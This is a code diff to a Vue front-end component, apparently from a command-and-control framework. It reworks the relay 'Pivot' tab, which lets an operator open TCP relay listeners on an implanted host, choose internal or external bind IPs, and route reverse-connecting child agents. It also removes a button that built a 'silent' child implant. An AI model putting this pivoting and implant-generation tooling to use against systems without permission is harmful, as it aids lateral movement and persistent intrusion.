@@ -11,22 +11,23 @@
     <div class="pivot-start">
       <div class="row">
         <label>Bind IP</label>
-        <input v-model="form.bind_ip" placeholder="0.0.0.0" class="inp" />
+        <select v-model="form.bind_ip" class="inp">
+          <option value="0.0.0.0">0.0.0.0 (all interfaces)</option>
+          <option v-if="parentInternal" :value="parentInternal">{{ parentInternal }} (internal)</option>
+          <option v-if="parentExternal && parentExternal !== '-'" :value="parentExternal">{{ parentExternal }} (external)</option>
+          <option value="__custom">— custom —</option>
+        </select>
+        <input v-if="form.bind_ip === '__custom'" v-model="customBind" placeholder="enter IP" class="inp" />
         <label>Port</label>
         <input v-model.number="form.port" type="number" min="0" max="65535" placeholder="0 = auto" class="inp port" />
         <button class="btn primary" @click="startRelay" :disabled="starting">
           <Plus :size="12" /> {{ starting ? 'Starting…' : 'Start Relay' }}
         </button>
       </div>
-      <div class="row child-row">
-        <label class="child-label"><Download :size="12" /> Child callback</label>
-        <input v-model="childHost" placeholder="parent reachable IP (e.g. 192.168.1.50)" class="inp host" />
-        <label class="check"><input v-model="childSilent" type="checkbox" /><span>Silent</span></label>
-        <span class="child-hint">Generate a child agent pointing at <code>{{ childConnect }}</code> — one click, no ListenerManager.</span>
-      </div>
       <p class="hint">
-        The implant opens a TCP listener and splices each child connection onto a fresh link to the core.
-        A child agent pointing its callback at <code>{{ connectHint }}</code> will appear online as a new implant.
+        The implant opens a TCP listener on the chosen bind IP and splices each child connection onto a fresh link to the core.
+        Pick the parent's <strong>internal</strong> IP for same-LAN children, or its <strong>external</strong> IP for reachable-from-WAN pivots.
+        After it's running, generate the child from the <strong>Listener's Generate Agent</strong> dialog — pick this relay there.
       </p>
     </div>
 
@@ -37,7 +38,7 @@
             <th style="width: 120px">ID</th>
             <th>Listen</th>
             <th style="width: 110px">State</th>
-            <th style="width: 180px">Action</th>
+            <th style="width: 110px">Action</th>
           </tr>
         </thead>
         <tbody>
@@ -52,14 +53,6 @@
             </td>
             <td><span class="state" :class="stateClass(r.state)">{{ r.state }}</span></td>
             <td class="action-cell">
-              <button
-                class="btn primary sm"
-                @click="generateChild(r)"
-                :disabled="r.state !== 'running' || !r.port || generating"
-                :title="r.state === 'running' && r.port ? `Generate child → ${childHost || parentHost}:${r.port}` : 'relay not running'"
-              >
-                <Download :size="11" /> {{ generating ? '…' : 'Generate Child' }}
-              </button>
               <button class="btn danger sm" @click="stopRelay(r)" :disabled="r.state === 'stopping' || r.state === 'stopped'">
                 <Square :size="11" /> Stop
               </button>
@@ -67,18 +60,18 @@
           </tr>
         </tbody>
       </table>
-      <div v-if="!relays.length && !loading" class="empty">No relay listeners. Start one above.</div>
+      <div v-if="!relays.length && !loading" class="empty">No relay listeners. Start one above, then generate the child from a Listener.</div>
     </div>
 
     <div class="pivot-footer">
-      {{ relays.length }} relay(s) · connect string uses the parent's reachable IP + the relay port
+      {{ relays.length }} relay(s) · child agents are generated from the Listener's Generate Agent dialog (pick the relay as callback)
     </div>
   </div>
 </template>
 
 <script setup lang="ts">
-import { ref, computed, watch, onMounted, onUnmounted } from 'vue'
-import { Network, RefreshCw, Plus, Square, Copy, Download } from 'lucide-vue-next'
+import { ref, computed, onMounted, onUnmounted } from 'vue'
+import { Network, RefreshCw, Plus, Square, Copy } from 'lucide-vue-next'
 import api from '../services/api'
 import { useToastStore } from '../stores/toast'
 import { useAppStore } from '../stores/app'
@@ -88,27 +81,26 @@ const toast = useToastStore()
 const appStore = useAppStore()
 
 const form = ref({ bind_ip: '0.0.0.0', port: 0 })
+const customBind = ref('')
 const relays = ref<any[]>([])
 const loading = ref(false)
 const starting = ref(false)
-const generating = ref(false)
-// Child-agent callback config (one-click generate from the Pivot tab). Host
-// defaults to the parent's detected reachable IP; the operator can override.
-const childHost = ref('')
-const childSilent = ref(true)
 let pollTimer: ReturnType<typeof setInterval> | null = null
 
-// Suggested connect host: the parent's external IP if known, else its internal
-// IP, else the bind IP. The operator copies <host>:<port> into Generate Agent.
-const parentHost = computed(() => {
-  const b = appStore.beacons.find((x: any) => String(x.id) === String(props.targetId))
-  return b?.external_ip || b?.internal_ip || form.value.bind_ip
-})
-const connectHint = computed(() => `${parentHost.value}:<port>`)
-// Pre-fill childHost once the parent's IP is known, but don't clobber a manual
-// edit afterwards.
-watch(parentHost, (h) => { if (!childHost.value) childHost.value = h }, { immediate: true })
-const childConnect = computed(() => `${childHost.value || parentHost.value}:<relay port>`)
+// Parent implant's detected IPs (from the auto-run sysinfo BOF). Used to
+// populate the bind-IP dropdown so the operator can pick internal vs external
+// explicitly instead of guessing.
+const parent = computed(() => appStore.beacons.find((x: any) => String(x.id) === String(props.targetId)))
+const parentInternal = computed(() => (parent.value?.internal_ip && parent.value.internal_ip !== '-') ? parent.value.internal_ip : '')
+const parentExternal = computed(() => (parent.value?.external_ip && parent.value.external_ip !== '-') ? parent.value.external_ip : '')
+
+// The address a child should dial to reach this relay: the bind IP the operator
+// chose (the parent listens there), or the parent's detected IP as a fallback.
+const relayReachable = (r: any) => {
+  const b = r.bind_ip
+  if (b && b !== '0.0.0.0') return b
+  return parentInternal.value || parentExternal.value || ''
+}
 
 const stateClass = (s: string) => {
   if (s === 'running') return 'st-running'
@@ -131,14 +123,22 @@ const fetchRelays = async () => {
 }
 
 const startRelay = async () => {
+  let bindIP = form.value.bind_ip
+  if (bindIP === '__custom') {
+    bindIP = customBind.value.trim()
+    if (!bindIP) { toast.error('Enter a custom bind IP'); return }
+  }
   starting.value = true
   try {
     await api.post(`/nodes/${props.targetId}/relay`, {
-      bind_ip: form.value.bind_ip || '0.0.0.0',
+      bind_ip: bindIP || '0.0.0.0',
       port: Number(form.value.port) || 0
     })
     toast.success('Relay requested — listening port will appear shortly')
     await fetchRelays()
+    // The implant replies relay_started within milliseconds; re-fetch shortly
+    // so the requested→running transition (and the bound port) shows up.
+    setTimeout(fetchRelays, 600)
   } catch (err: any) {
     toast.error(err?.message || 'Failed to start relay')
   } finally {
@@ -159,7 +159,8 @@ const stopRelay = async (r: any) => {
 }
 
 const copyConnect = async (r: any) => {
-  const s = `${parentHost.value}:${r.port}`
+  const host = relayReachable(r)
+  const s = `${host}:${r.port}`
   try {
     await navigator.clipboard.writeText(s)
     toast.success(`Copied ${s}`)
@@ -168,41 +169,21 @@ const copyConnect = async (r: any) => {
   }
 }
 
-// One-click: generate a child agent that reverse-connects through this relay.
-// Reuses the core's /stub/build (which pops the OS Save As dialog via the Wails
-// bridge) — same path as GenerateAgentModal, just scoped to the relay port.
-const generateChild = async (r: any) => {
-  const host = (childHost.value || parentHost.value).trim()
-  if (!host) { toast.error('Enter the child callback host (parent reachable IP)'); return }
-  if (!r.port) { toast.error('Relay has no bound port yet'); return }
-  generating.value = true
-  try {
-    const name = `pivot_child_${host}_${r.port}`
-    const res = await api.post('/stub/build', { host, port: String(r.port), name, silent: childSilent.value })
-    const p = res.data?.data?.path
-    if (!p) {
-      toast.info('Save cancelled')
-      return
-    }
-    toast.success(`Child agent saved: ${p}`)
-  } catch (err: any) {
-    toast.error(err?.message || 'Failed to generate child agent')
-  } finally {
-    generating.value = false
-  }
-}
-
 const onSync = () => fetchRelays()
+// React instantly to relay_changed events so the table picks up the
+// requested→running transition the moment the implant's relay_started reply
+// lands — instead of waiting up to 2s for the poll.
+const onRelayChanged = () => fetchRelays()
 
 onMounted(async () => {
   window.addEventListener('ghost:sync', onSync as EventListener)
+  window.addEventListener('ghost:relay-changed', onRelayChanged as EventListener)
   await fetchRelays()
-  // The actual bound port (port 0 = auto) arrives async via relay_started; poll
-  // briefly so the table updates without a manual refresh.
   pollTimer = setInterval(fetchRelays, 2000)
 })
 onUnmounted(() => {
   window.removeEventListener('ghost:sync', onSync as EventListener)
+  window.removeEventListener('ghost:relay-changed', onRelayChanged as EventListener)
   if (pollTimer) clearInterval(pollTimer)
 })
 </script>
@@ -217,18 +198,11 @@ onUnmounted(() => {
 .row { display: flex; align-items: center; gap: 8px; margin-top: 6px; }
 .row:first-child { margin-top: 0; }
 .row label { font-size: 10px; color: var(--tx-3); text-transform: uppercase; letter-spacing: 0.05em; }
-.inp { background: var(--bg-3); border: 1px solid var(--bd); color: var(--tx); padding: 5px 8px; border-radius: 3px; font-size: 11px; outline: none; width: 140px; }
+.inp { background: var(--bg-3); border: 1px solid var(--bd); color: var(--tx); padding: 5px 8px; border-radius: 3px; font-size: 11px; outline: none; width: 180px; }
 .inp.port { width: 90px; }
-.inp.host { width: 240px; }
 .inp:focus { border-color: var(--pri); }
-.child-row { align-items: center; }
-.child-label { display: inline-flex; align-items: center; gap: 4px; color: var(--pri) !important; }
-.check { display: inline-flex; align-items: center; gap: 5px; font-size: 11px; color: var(--tx-2); text-transform: none; letter-spacing: normal; cursor: pointer; }
-.check input { width: auto; margin: 0; }
-.child-hint { font-size: 10px; color: var(--tx-4); }
-.child-hint code { background: var(--bg-3); padding: 1px 5px; border-radius: 3px; color: var(--pri); font-family: var(--font-mono); }
 .hint { margin: 8px 0 0; font-size: 10px; color: var(--tx-4); line-height: 1.5; }
-.hint code { background: var(--bg-3); padding: 1px 5px; border-radius: 3px; color: var(--pri); font-family: var(--font-mono); }
+.hint strong { color: var(--tx-2); }
 
 .btn { display: flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 3px; border: 1px solid var(--bd); background: var(--bg-3); color: var(--tx-2); cursor: pointer; font-size: 11px; }
 .btn:disabled { opacity: 0.4; cursor: not-allowed; }
